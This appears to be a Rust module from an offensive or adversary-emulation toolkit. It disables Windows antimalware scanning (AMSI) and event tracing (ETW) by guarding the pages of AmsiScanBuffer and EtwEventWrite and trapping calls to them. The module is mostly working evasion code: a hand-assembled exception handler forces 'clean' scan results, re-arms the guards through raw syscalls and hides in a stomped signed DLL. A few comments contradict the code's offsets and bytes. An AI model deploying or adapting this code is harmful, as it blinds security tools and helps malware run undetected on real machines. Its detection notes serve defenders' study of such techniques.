//! AMSI/ETW suppression via guard-page execution interposition
//! (ABR-T041): the patch-free AND debug-register-free successor of
//! ABR-T024/T036. The 4 KB pages of `ntdll!EtwEventWrite` and
//! `amsi.dll!AmsiScanBuffer` are re-protected `orig | PAGE_GUARD`;
//! every execution (or any access) on those pages raises
//! STATUS_GUARD_PAGE_VIOLATION BEFORE the access completes, and a
//! hand-assembled vectored handler — same external-page + unwind
//! discipline as ABR-T036, so it survives `.text` encryption during
//! sleep — decides:
//!
//! - fault AT a target → retire the call with the "clean" return
//!   (identical semantics to the T024 stubs: `EtwEventWrite` → Rax=0,
//!   `AmsiScanBuffer` → Rax=0 and `*AMSI_RESULT`=CLEAN (arg6, at `[Rsp+0x30]` on entry — arg5's home slot is +0x28)), redirect Rip
//!   to a `ret` on a DIFFERENT page, re-arm both guards, continue.
//! - fault elsewhere on the pages (a page-mate function) → set the
//!   trap flag and continue: the faulting instruction executes (the
//!   guard was one-shot-dismissed by the kernel), single-step traps
//!   after it, and the handler steps Rip page-mate instruction by
//!   instruction until it leaves the guarded pages — then clears TF
//!   and re-arms. The target stays trapped the whole time except for
//!   that microsecond chain.
//! - any other guard violation (a thread-stack growth page, an
//!   application guard page) → pass through, untouched.
//!
//! What this buys over the byte patch: ZERO bytes of any signed module
//! diverge from disk — pe-sieve-style "hooked module" scanning sees a
//! pristine image. What it buys over T036: no debug-register write
//! exists to be discarded, so it works on the VBS/hypervisor builds
//! where DR ownership killed T036. The artifact that replaces both:
//! `VirtualQuery` over module `.text` reporting `PAGE_GUARD` on RX
//! image pages — nothing legitimate guards ntdll's code — plus the
//! exception-rate anomaly while managed code runs. See
//! docs/detections/abr-t041.md.
//!
//! Residual, documented: during a page-mate TF chain the guard is
//! dismissed, so a target call from ANOTHER thread in that window runs
//! for real (same class as T036's main-thread-only coverage); and
//! retirement redirects to a `ret` outside the guarded pages so the
//! resume fetch itself cannot re-fault.
#![allow(clippy::missing_transmute_annotations)] // house FFI idiom

use super::{stomp, syscalls, unwind};
use std::sync::OnceLock;

const PAGE_LEN: usize = 0x1000;
/// Offset of the qword slot (holding the params-page address) inside
/// the code page; the handler loads it rip-relatively.
const PARAMS_SLOT: usize = 0x190;
const UNWIND_META_OFFSET: usize = 0x200;

const PAGE_GUARD: u32 = 0x100;
const PAGE_EXECUTE_FLAGS: u32 = 0x10 | 0x20 | 0x40; // EXUTE | EXECUTE_READ | EXECUTE_READWRITE
#[cfg_attr(not(test), allow(dead_code))]
const STATUS_GUARD_PAGE_VIOLATION: u32 = 0x8000_0001;

/// Params block on a separate RW page (the code page stays RX; the
/// re-arm syscalls write through the IN/OUT pointers and the old
/// protection out-param here). Offsets: 0x00 etw, 0x08 amsi, 0x10
/// etw_skip, 0x18 amsi_skip, 0x20 reserved, 0x28 etw_page (syscall
/// Base*), 0x30 etw_end, 0x38 amsi_page (Base*), 0x40 amsi_end, 0x48
/// etw_prot (dword), 0x50 amsi_prot (dword), 0x58 scratch (dword,
/// OldProtection*), 0x78 size (qword, syscall Size*, 0x1000), 0x80 ssn
/// (dword, NtProtectVirtualMemory, resolved at arm time). The first
/// cut carried a kernel32!VirtualProtect pointer and CALLED it from
/// the handler — kernelbase's own ETW instrumentation faulted on the
/// still-guarded page and the nested dispatch corrupted the flow (AV,
/// rip=amsi page); the raw-syscall re-arm has no user-mode callee at
/// all.
#[repr(C)]
#[derive(Clone, Copy)]
struct Params {
    etw: u64,
    amsi: u64,
    etw_skip: u64,
    amsi_skip: u64,
    reserved: u64,
    etw_page: u64,
    etw_end: u64,
    amsi_page: u64,
    amsi_end: u64,
    etw_prot: u32,
    amsi_prot: u32,
    _pad3: u32,
    scratch: u32,
    _pad: [u32; 7],
    size: u64,
    ssn: u32,
    _pad2: u32,
}

/// x64 CONTEXT offsets touched by the handler (test-side readers; the
/// handler embeds them as immediates).
#[cfg_attr(not(test), allow(dead_code))]
const CTX_EFLAGS: usize = 0x44; // dword
#[cfg_attr(not(test), allow(dead_code))]
const CTX_RAX: usize = 0x78;
#[cfg_attr(not(test), allow(dead_code))]
const CTX_RSP: usize = 0x98;
#[cfg_attr(not(test), allow(dead_code))]
const CTX_RIP: usize = 0xF8;
#[cfg_attr(not(test), allow(dead_code))]
const TRAP_FLAG: u32 = 0x100;

/// VEH handler, assembled with every rel32/rip displacement computed
/// by tooling (`.zcode/gen_guard.py`); the layout and synthetic-context
/// tests pin the semantics. Block map: entry 0x00, single-step 0x1F,
/// guard 0x6D, retire-etw 0xC6, retire-amsi 0xDE, re-arm 0x10C,
/// pass-through 0x160, params-pointer slot 0x180.
#[rustfmt::skip]
const HANDLER: [u8; 0x198] = [
    0x48, 0x8B, 0x11, 0x4C, 0x8B, 0x49, 0x08, 0x8B, 0x02, 0x3D, 0x01, 0x00,
    0x00, 0x80, 0x0F, 0x84, 0x59, 0x00, 0x00, 0x00, 0x3D, 0x04, 0x00, 0x00,
    0x80, 0x0F, 0x85, 0x61, 0x01, 0x00, 0x00, 0x4F, 0x8B, 0x91, 0xF8, 0x00,
    0x00, 0x00, 0x4C, 0x8B, 0x1D, 0x63, 0x01, 0x00, 0x00, 0x4D, 0x3B, 0x53,
    0x28, 0x0F, 0x82, 0x0A, 0x00, 0x00, 0x00, 0x4D, 0x3B, 0x53, 0x30, 0x0F,
    0x82, 0x26, 0x00, 0x00, 0x00, 0x4D, 0x3B, 0x53, 0x38, 0x0F, 0x82, 0x0A,
    0x00, 0x00, 0x00, 0x4D, 0x3B, 0x53, 0x40, 0x0F, 0x82, 0x12, 0x00, 0x00,
    0x00, 0x41, 0x8B, 0x41, 0x44, 0x25, 0xFF, 0xFE, 0xFF, 0xFF, 0x41, 0x89,
    0x41, 0x44, 0xE9, 0xA5, 0x00, 0x00, 0x00, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC3, 0x4F, 0x8B, 0x91, 0xF8, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x1D, 0x15,
    0x01, 0x00, 0x00, 0x4D, 0x3B, 0x13, 0x74, 0x46, 0x4D, 0x3B, 0x53, 0x08,
    0x74, 0x58, 0x4D, 0x3B, 0x53, 0x28, 0x0F, 0x82, 0x0A, 0x00, 0x00, 0x00,
    0x4D, 0x3B, 0x53, 0x30, 0x0F, 0x82, 0x19, 0x00, 0x00, 0x00, 0x4D, 0x3B,
    0x53, 0x38, 0x0F, 0x82, 0xDC, 0x00, 0x00, 0x00, 0x4D, 0x3B, 0x53, 0x40,
    0x0F, 0x82, 0x05, 0x00, 0x00, 0x00, 0xE9, 0xCD, 0x00, 0x00, 0x00, 0x41,
    0x8B, 0x41, 0x44, 0x0D, 0x00, 0x01, 0x00, 0x00, 0x41, 0x89, 0x41, 0x44,
    0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0x49, 0xC7, 0x41, 0x78, 0x00, 0x00,
    0x00, 0x00, 0x4D, 0x03, 0x53, 0x10, 0x4D, 0x89, 0x91, 0xF8, 0x00, 0x00,
    0x00, 0xE9, 0x2E, 0x00, 0x00, 0x00, 0x49, 0xC7, 0x41, 0x78, 0x00, 0x00,
    0x00, 0x00, 0x49, 0x8B, 0x81, 0x98, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0,
    0x74, 0x0F, 0x48, 0x8B, 0x48, 0x30, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xC7,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x03, 0x53, 0x18, 0x4D, 0x89, 0x91,
    0xF8, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF, 0x49,
    0x8D, 0x53, 0x28, 0x4D, 0x8D, 0x43, 0x78, 0x45, 0x8B, 0x4B, 0x48, 0x41,
    0x81, 0xC9, 0x00, 0x01, 0x00, 0x00, 0x49, 0x8D, 0x43, 0x58, 0x48, 0x89,
    0x44, 0x24, 0x28, 0x41, 0x8B, 0x83, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x05,
    0x4C, 0x8B, 0x1D, 0x51, 0x00, 0x00, 0x00, 0x41, 0x89, 0x43, 0x5C, 0x49,
    0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x8D, 0x53, 0x38, 0x4D, 0x8D,
    0x43, 0x78, 0x45, 0x8B, 0x4B, 0x50, 0x41, 0x81, 0xC9, 0x00, 0x01, 0x00,
    0x00, 0x49, 0x8D, 0x43, 0x58, 0x48, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8B,
    0x83, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x4C, 0x8B, 0x1D, 0x1A, 0x00,
    0x00, 0x00, 0x41, 0x89, 0x43, 0x60, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3,
    0x31, 0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

pub struct Armed {
    pub etw: usize,
    pub amsi: usize,
    code_page: usize,
    params_page: usize,
    /// AddVectoredExceptionHandler handle (kept for a future clean
    /// RemoveVectoredExceptionHandler disarm; the guard pages alone are
    /// what disarm() restores).
    #[allow(dead_code)]
    veh: usize,
}

static ARMED: OnceLock<Result<Armed, String>> = OnceLock::new();

/// Last NTSTATUS of each re-arm syscall (params+0x5C etw, +0x60 amsi),
/// written by the handler for lab diagnostics; (0, 0) means armed but
/// no re-arm ran yet.
pub fn rearm_trace() -> (u32, u32) {
    match ARMED.get() {
        Some(Ok(armed)) => unsafe {
            (
                std::ptr::read_volatile((armed.params_page + 0x5C) as *const u32),
                std::ptr::read_volatile((armed.params_page + 0x60) as *const u32),
            )
        },
        _ => (0xDEAD_BEEF, 0xDEAD_BEEF),
    }
}

/// Builds pages, registers the VEH, arms both guards and probes the
/// retirement end-to-end; idempotent, first caller wins. Failure falls
/// the caller back to the ABR-T024 byte patch.
pub fn ensure_armed() -> Result<&'static Armed, String> {
    if let Some(set) = ARMED.get() {
        return set.as_ref().map_err(|e| e.clone());
    }
    let built = build_handler()
        .and_then(|a| a.register_veh())
        .and_then(|a| a.arm_guards())
        .and_then(|a| a.probe());
    let _ = ARMED.set(built);
    ARMED.get().unwrap().as_ref().map_err(|e| e.clone())
}

/// Restores both pages' original protections (idempotent). Used when
/// ABR-T036's breakpoints take over and by the disarm test.
pub fn disarm() -> Result<(), String> {
    if let Some(Ok(armed)) = ARMED.get() {
        armed.restore_pages()?;
    }
    Ok(())
}

fn resolve(module: &str, name: &str) -> Result<usize, String> {
    unsafe { syscalls::export_address(module, name) }
        .ok_or_else(|| format!("{module}!{name} unresolved"))
}

/// Writes the handler + params (no VEH, no guard yet) — separated so
/// the synthetic test can drive the bytes without real exceptions.
fn build_handler() -> Result<Armed, String> {
    // The manual resolver loads amsi.dll on demand (no IAT entry).
    let etw = resolve("ntdll.dll", "EtwEventWrite")?;
    let amsi = resolve("amsi.dll", "AmsiScanBuffer")?;
    // Retirement resumes at a `ret` OUTSIDE the guarded pages — the
    // resume fetch itself must not re-fault (a plain 0xC3 anywhere
    // behaves identically: it pops the caller's address).
    let etw_skip = scan_ret_off_page(etw).ok_or("no exec-page ret near EtwEventWrite")?;
    let amsi_skip = scan_ret_off_page(amsi).ok_or("no exec-page ret near AmsiScanBuffer")?;

    let ssn = unsafe { syscalls::resolve("NtProtectVirtualMemory") }
        .ok_or("NtProtectVirtualMemory SSN unresolved")?
        .ssn;
    let params = Params {
        etw: etw as u64,
        amsi: amsi as u64,
        etw_skip: etw_skip as u64,
        amsi_skip: amsi_skip as u64,
        reserved: 0,
        etw_page: (etw & !(PAGE_LEN - 1)) as u64,
        etw_end: ((etw & !(PAGE_LEN - 1)) + PAGE_LEN) as u64,
        amsi_page: (amsi & !(PAGE_LEN - 1)) as u64,
        amsi_end: ((amsi & !(PAGE_LEN - 1)) + PAGE_LEN) as u64,
        etw_prot: 0,
        amsi_prot: 0,
        _pad3: 0,
        scratch: 0,
        _pad: [0; 7],
        size: PAGE_LEN as u64,
        ssn,
        _pad2: 0,
    };
    // RW params page: stays writable for the handler's re-arm syscalls
    // (the code page is RX; this is the writable half).
    let params_page = unsafe { syscalls::alloc_rw(PAGE_LEN) }.ok_or("params page alloc failed")?;
    unsafe {
        std::ptr::write_volatile(params_page as *const Params as *mut Params, params);
    }

    // External code page: stomped signed DLL when the carver has one
    // (ABR-T012), private RW otherwise — never the encrypted `.text`.
    let page = match stomp::code_page(PAGE_LEN) {
        Some(stomped) => stomped,
        None => unsafe { syscalls::alloc_rw(PAGE_LEN) }
            .ok_or_else(|| "code page allocation failed".to_string())?,
    };
    for (index, byte) in HANDLER.iter().enumerate() {
        unsafe { std::ptr::write_volatile((page + index) as *mut u8, *byte) };
    }
    // The params-page address rides in the code page's slot; the
    // handler loads it rip-relatively on every use.
    unsafe { std::ptr::write_volatile((page + PARAMS_SLOT) as *mut u64, params_page as u64) };
    let _unwind = unsafe {
        unwind::FunctionTable::register(
            page,
            &[unwind::Routine {
                offset: 0,
                len: 0x183,
                prolog_end: 0,
                prolog: &[],
            }],
            UNWIND_META_OFFSET,
        )
    }?;
    unsafe { syscalls::protect(page, PAGE_LEN, 0x20) }.ok_or("code page protect failed")?;

    Ok(Armed {
        etw,
        amsi,
        code_page: page,
        params_page,
        veh: 0,
    })
}

impl Armed {
    fn register_veh(self) -> Result<Armed, String> {
        let add: unsafe extern "system" fn(u32, usize) -> usize =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "AddVectoredExceptionHandler")?) };
        let handle = unsafe { add(1, self.code_page) };
        if handle == 0 {
            return Err("vectored handler rejected".into());
        }
        Ok(Armed {
            veh: handle,
            ..self
        })
    }

    /// Re-protects both target pages to `current | PAGE_GUARD`,
    /// recording the originals in the params block for the handler's
    /// re-arm path.
    fn arm_guards(self) -> Result<Armed, String> {
        let protect: unsafe extern "system" fn(usize, usize, u32, *mut u32) -> i32 =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "VirtualProtect")?) };
        let query = page_protect_of;
        for (target, slot_off) in [(self.etw, 0x48usize), (self.amsi, 0x50usize)] {
            let base = target & !(PAGE_LEN - 1);
            let current = query(base).ok_or("target page protect query failed")?;
            if current & PAGE_EXECUTE_FLAGS == 0 {
                return Err(format!("target page not executable ({current:#x})"));
            }
            let mut old = 0u32;
            if unsafe { protect(base, PAGE_LEN, current | PAGE_GUARD, &mut old) } == 0 {
                return Err("VirtualProtect(guard) refused".into());
            }
            unsafe {
                std::ptr::write_volatile((self.params_page + slot_off) as *mut u32, current);
            }
        }
        Ok(self)
    }

    /// End-to-end probe: with the guard live, a direct null-argument
    /// EtwEventWrite must be retired with STATUS_SUCCESS (the real
    /// function fails the null registration handle instead).
    fn probe(self) -> Result<Armed, String> {
        let write: unsafe extern "system" fn(usize, usize, usize) -> u32 =
            unsafe { std::mem::transmute(self.etw) };
        let status = unsafe { write(0, 0, 0) };
        if status != 0 {
            self.restore_pages().ok();
            return Err("guard probe: EtwEventWrite not retired".into());
        }
        Ok(self)
    }

    fn restore_pages(&self) -> Result<(), String> {
        let protect: unsafe extern "system" fn(usize, usize, u32, *mut u32) -> i32 =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "VirtualProtect")?) };
        let etw_prot = unsafe { std::ptr::read_volatile((self.params_page + 0x48) as *const u32) };
        let amsi_prot = unsafe { std::ptr::read_volatile((self.params_page + 0x50) as *const u32) };
        for (base, prot) in [
            (self.etw & !(PAGE_LEN - 1), etw_prot),
            (self.amsi & !(PAGE_LEN - 1), amsi_prot),
        ] {
            if prot & PAGE_EXECUTE_FLAGS == 0 {
                continue; // never armed
            }
            let mut old = 0u32;
            if unsafe { protect(base, PAGE_LEN, prot, &mut old) } == 0 {
                return Err("restore VirtualProtect failed".into());
            }
        }
        Ok(())
    }
}

/// Current protection of the page containing `addr`, through the
/// indirect-syscall NtQueryVirtualMemory (kernel32!VirtualQuery is a
/// forwarder the manual resolver declines; the syscall path is the one
/// stomp.rs already proved). Same MBI layout as syscalls.rs.
fn page_protect_of(addr: usize) -> Option<u32> {
    #[repr(C)]
    #[allow(non_snake_case)]
    struct MemoryBasicInformation {
        BaseAddress: usize,
        AllocationBase: usize,
        AllocationProtect: u32,
        PartitionId: u16,
        _pad: u16,
        RegionSize: usize,
        State: u32,
        Protect: u32,
        Type: u32,
    }
    let query = unsafe { syscalls::resolve("NtQueryVirtualMemory") }?;
    let mut mbi: MemoryBasicInformation = unsafe { std::mem::zeroed() };
    let mut needed = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query,
            usize::MAX, // current process
            addr,
            0, // MemoryBasicInformation
            &mut mbi as *mut MemoryBasicInformation as usize,
            std::mem::size_of::<MemoryBasicInformation>(),
            &mut needed as *mut usize as usize,
        )
    };
    if (status as u32 as i32) < 0 {
        return None;
    }
    Some(mbi.Protect & !PAGE_GUARD)
}

/// Offset of a `ret` (0xC3) on an EXECUTABLE page OUTSIDE the
/// function's own page, within +0x4000: the retirement resume point.
fn scan_ret_off_page(func: usize) -> Option<usize> {
    let mut last_page_exec = false;
    let mut last_page = 0usize;
    for off in (PAGE_LEN..4 * PAGE_LEN).step_by(1) {
        let addr = func + off;
        let page = addr & !(PAGE_LEN - 1);
        if page != last_page {
            last_page = page;
            last_page_exec = page_protect_of(addr)
                .map(|p| p & PAGE_EXECUTE_FLAGS != 0)
                .unwrap_or(false);
        }
        if last_page_exec && unsafe { std::ptr::read_volatile(addr as *const u8) } == 0xC3 {
            return Some(off);
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn handler_layout_is_self_consistent() {
        // Entry loads both halves of EXCEPTION_POINTERS and the code.
        assert_eq!(&HANDLER[0x00..0x03], &[0x48, 0x8B, 0x11]); // mov rdx,[rcx]
        assert_eq!(&HANDLER[0x03..0x07], &[0x4C, 0x8B, 0x49, 0x08]); // mov r9,[rcx+8]
        assert_eq!(&HANDLER[0x07..0x09], &[0x8B, 0x02]); // mov eax,[rdx]
                                                         // Guard / single-step dispatch on the exception code.
        assert_eq!(&HANDLER[0x09..0x0E], &[0x3D, 0x01, 0x00, 0x00, 0x80]);
        assert_eq!(&HANDLER[0x14..0x19], &[0x3D, 0x04, 0x00, 0x00, 0x80]);
        // Both rip loads from the CONTEXT use [r9+0xF8] (4C 8B 91 F8).
        assert_eq!(
            &HANDLER[0x1F..0x26],
            &[0x4F, 0x8B, 0x91, 0xF8, 0x00, 0x00, 0x00]
        );
        assert_eq!(
            &HANDLER[0x6D..0x74],
            &[0x4F, 0x8B, 0x91, 0xF8, 0x00, 0x00, 0x00]
        );
        // The two params-pointer loads are mov r11,[rip+disp] landing on
        // the slot (fixups verified at generation; pinned here).
        let check_slot = |pos: usize| {
            let next = pos + 7;
            let disp = i32::from_le_bytes([
                HANDLER[pos + 3],
                HANDLER[pos + 4],
                HANDLER[pos + 5],
                HANDLER[pos + 6],
            ]);
            (next + disp as usize) == PARAMS_SLOT
        };
        assert!(check_slot(0x26));
        assert!(check_slot(0x74));
        assert!(check_slot(0x138)); // post-syscall reload (syscall clobbers r11)
                                    // Re-arm is raw syscall: mov r10d,-1 twice, two `syscall` sites,
                                    // no user-mode callee at all (the VP-from-handler design died on
                                    // kernelbase's own ETW emission — see the module doc).
        assert_eq!(
            &HANDLER[0x10C..0x113],
            &[0x49, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF]
        ); // mov r10,-1 (sign-extended)
        assert_eq!(&HANDLER[0x136..0x138], &[0x0F, 0x05]); // syscall (etw)
        assert_eq!(&HANDLER[0x16D..0x16F], &[0x0F, 0x05]); // syscall (amsi)
        assert_eq!(&HANDLER[0x176..0x17A], &[0x41, 0x89, 0x43, 0x60]); // mov [r11+0x60],eax (status trace)
                                                                       // Terminal returns.
        assert_eq!(
            &HANDLER[0x17A..0x180],
            &[0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3]
        );
        assert_eq!(&HANDLER[0x180..0x183], &[0x31, 0xC0, 0xC3]);
    }

    /// Drives the assembled handler with synthetic kernel-delivery
    /// state (EXCEPTION_POINTERS/CONTEXT). The re-arm path performs
    /// REAL NtProtectVirtualMemory syscalls — the assertion after each
    /// retirement is the page's live protection gaining PAGE_GUARD,
    /// which is stronger than any recorder stub (the first cut's stub
    /// hid two live-only bugs: the VP-forwarder crash and the nested
    /// ETW recursion).
    #[test]
    #[ignore = "re-protects real ntdll/amsi pages; run with --test-threads=1"]
    fn handler_drives_synthetic_contexts() {
        let armed = build_handler().expect("build handler");
        let handler: unsafe extern "system" fn(usize) -> i32 =
            unsafe { std::mem::transmute(armed.code_page) };
        let params: Params = unsafe { std::ptr::read_volatile(armed.params_page as *const Params) };

        // The re-arm syscalls need the current protections in the params;
        // read them from the live pages (pages are NOT guarded yet).
        let etw_now = page_protect_of(params.etw_page as usize).expect("etw prot");
        let amsi_now = page_protect_of(params.amsi_page as usize).expect("amsi prot");
        unsafe {
            std::ptr::write_volatile((armed.params_page + 0x48) as *mut u32, etw_now);
            std::ptr::write_volatile((armed.params_page + 0x50) as *mut u32, amsi_now);
        }
        let guarded = |addr: usize| {
            // page_protect_of strips the guard bit, so query raw.
            #[repr(C)]
            #[allow(non_snake_case)]
            struct Mbi {
                Base: usize,
                AllocBase: usize,
                AllocProt: u32,
                Pid: u16,
                Pad: u16,
                Size: usize,
                State: u32,
                Protect: u32,
                Typ: u32,
            }
            let query = unsafe { syscalls::resolve("NtQueryVirtualMemory").unwrap() };
            let mut mbi: Mbi = unsafe { std::mem::zeroed() };
            let mut needed = 0usize;
            unsafe {
                syscalls::dispatch6(
                    query,
                    usize::MAX,
                    addr & !(PAGE_LEN - 1),
                    0,
                    &mut mbi as *mut Mbi as usize,
                    std::mem::size_of::<Mbi>(),
                    &mut needed as *mut usize as usize,
                )
            };
            mbi.Protect & 0x100 != 0
        };

        #[repr(C, align(16))]
        struct Ctx([u8; 0x410]);
        let put = |c: &mut Ctx, off: usize, v: u64| {
            c.0[off..off + 8].copy_from_slice(&v.to_le_bytes());
        };
        let get = |c: &Ctx, off: usize| u64::from_le_bytes(c.0[off..off + 8].try_into().unwrap());
        let eflags_tf = |c: &Ctx| {
            u32::from_le_bytes(c.0[CTX_EFLAGS..CTX_EFLAGS + 4].try_into().unwrap()) & TRAP_FLAG
        };
        let drive = |code: u32, rip: u64, ctx: &mut Ctx| -> i32 {
            put(ctx, CTX_RIP, rip);
            let mut record = [0u64; 2];
            record[0] = code as u64;
            let mut pointers = [0usize, 0usize];
            pointers[0] = record.as_ptr() as usize;
            pointers[1] = ctx as *mut Ctx as usize;
            unsafe { handler(pointers.as_ptr() as usize) }
        };

        // 1. Guard fault AT the ETW target: retired, and the re-arm
        //    syscall REALLY guarded both pages.
        let mut ctx = Ctx([0u8; 0x410]);
        assert_eq!(drive(STATUS_GUARD_PAGE_VIOLATION, params.etw, &mut ctx), -1);
        assert_eq!(get(&ctx, CTX_RAX), 0, "etw retire: Rax=0");
        assert_eq!(get(&ctx, CTX_RIP), params.etw + params.etw_skip);
        assert!(guarded(params.etw_page as usize), "re-arm guarded etw page");
        assert!(
            guarded(params.amsi_page as usize),
            "re-arm guarded amsi page"
        );

        // 2. Guard fault AT the AMSI target: S_OK, AMSI_RESULT CLEAN
        //    through [Rsp+0x28], rip at the out-of-page ret.
        let mut result: i32 = 0x7f;
        let mut stack = [0u64; 16];
        stack[6] = &mut result as *mut i32 as usize as u64; // arg6 spills at +0x30
        let mut ctx = Ctx([0u8; 0x410]);
        put(&mut ctx, CTX_RSP, stack.as_ptr() as u64);
        assert_eq!(
            drive(STATUS_GUARD_PAGE_VIOLATION, params.amsi, &mut ctx),
            -1
        );
        assert_eq!(get(&ctx, CTX_RAX), 0);
        assert_eq!(result, 0, "AMSI_RESULT_CLEAN");
        assert_eq!(get(&ctx, CTX_RIP), params.amsi + params.amsi_skip);

        // 3. Guard fault on a page-mate: TF set, rip untouched, and the
        //    guard on the etw page is now DISMISSED (one-shot) — the
        //    next target call would leak until the chain exits.
        let mut ctx = Ctx([0u8; 0x410]);
        let mate = params.etw_page + 0x800;
        assert_eq!(drive(STATUS_GUARD_PAGE_VIOLATION, mate, &mut ctx), -1);
        assert_eq!(eflags_tf(&ctx), TRAP_FLAG, "page-mate: TF set");
        assert_eq!(get(&ctx, CTX_RIP), mate, "page-mate: rip untouched");

        // 4. Single-step still inside the page: keep TF.
        let mut ctx = Ctx([0u8; 0x410]);
        put(&mut ctx, CTX_EFLAGS, TRAP_FLAG as u64);
        assert_eq!(drive(0x8000_0004, params.etw_page + 0x10, &mut ctx), -1);
        assert_eq!(eflags_tf(&ctx), TRAP_FLAG, "ss in-page: TF kept");

        // 5. Single-step OUTSIDE both pages: TF cleared and both pages
        //    re-guarded by the syscall re-arm.
        let mut ctx = Ctx([0u8; 0x410]);
        put(&mut ctx, CTX_EFLAGS, TRAP_FLAG as u64);
        assert_eq!(drive(0x8000_0004, 0x0000_5000_0000_0000, &mut ctx), -1);
        assert_eq!(eflags_tf(&ctx), 0, "ss exit: TF cleared");
        assert!(guarded(params.etw_page as usize), "ss-exit re-arm (etw)");
        assert!(guarded(params.amsi_page as usize), "ss-exit re-arm (amsi)");

        // 6. Guard fault outside our pages (e.g. stack growth): pass
        //    through, nothing touched.
        let mut ctx = Ctx([0u8; 0x410]);
        assert_eq!(
            drive(STATUS_GUARD_PAGE_VIOLATION, 0x0000_5000_0000_1000, &mut ctx),
            0
        );
        assert_eq!(get(&ctx, CTX_RIP), 0x0000_5000_0000_1000);
        assert_eq!(eflags_tf(&ctx), 0);

        // 7. Non-guard, non-ss exception: pass through.
        let mut ctx = Ctx([0u8; 0x410]);
        assert_eq!(drive(0xC000_0005, params.etw, &mut ctx), 0);

        // Restore pristine protections (the drives guarded for real).
        let protect: unsafe extern "system" fn(usize, usize, u32, *mut u32) -> i32 =
            unsafe { std::mem::transmute(resolve("kernel32.dll", "VirtualProtect").unwrap()) };
        for (base, prot) in [
            (params.etw_page as usize, etw_now),
            (params.amsi_page as usize, amsi_now),
        ] {
            let mut old = 0u32;
            unsafe { protect(base, PAGE_LEN, prot, &mut old) };
        }
    }

    #[test]
    #[ignore = "re-protects real ntdll/amsi pages; run with --test-threads=1"]
    fn guard_arms_probes_and_disarms() {
        let armed = match ensure_armed() {
            Ok(armed) => armed,
            Err(e) => {
                eprintln!("[i] guard arm failed on this host: {e}");
                return;
            }
        };
        // Both pages carry PAGE_GUARD now (raw query, correct MBI
        // layout — kernel32!VirtualQuery is a forwarder trap).
        for addr in [armed.etw, armed.amsi] {
            #[repr(C)]
            #[allow(non_snake_case)]
            struct Mbi {
                Base: usize,
                AllocBase: usize,
                AllocProt: u32,
                Pid: u16,
                Pad: u16,
                Size: usize,
                State: u32,
                Protect: u32,
                Typ: u32,
            }
            let call = unsafe { syscalls::resolve("NtQueryVirtualMemory").unwrap() };
            let mut mbi: Mbi = unsafe { std::mem::zeroed() };
            let mut needed = 0usize;
            let status = unsafe {
                syscalls::dispatch6(
                    call,
                    usize::MAX,
                    addr & !(PAGE_LEN - 1),
                    0,
                    &mut mbi as *mut Mbi as usize,
                    std::mem::size_of::<Mbi>(),
                    &mut needed as *mut usize as usize,
                )
            };
            assert!(status >= 0, "query failed");
            assert_ne!(
                mbi.Protect & PAGE_GUARD,
                0,
                "page not guarded ({:#x})",
                mbi.Protect
            );
        }
        // AMSI retired too: S_OK + CLEAN.
        let scan: unsafe extern "system" fn(usize, usize, usize, usize, usize, *mut i32) -> i32 =
            unsafe { std::mem::transmute(armed.amsi) };
        let mut result: i32 = -1;
        let hr = unsafe { scan(0, 0, 0, 0, 0, &mut result) };
        eprintln!("[arm] amsi probe hr={hr:#x} result={result}");
        assert_eq!(hr, 0);
        assert_eq!(result, 0);
        // Disarm restores pristine protections.
        disarm().expect("disarm");
        let write: unsafe extern "system" fn(usize, usize, usize) -> u32 =
            unsafe { std::mem::transmute(armed.etw) };
        assert_ne!(
            unsafe { write(0, 0, 0) },
            0,
            "real EtwEventWrite must fail the null handle again"
        );
    }
}
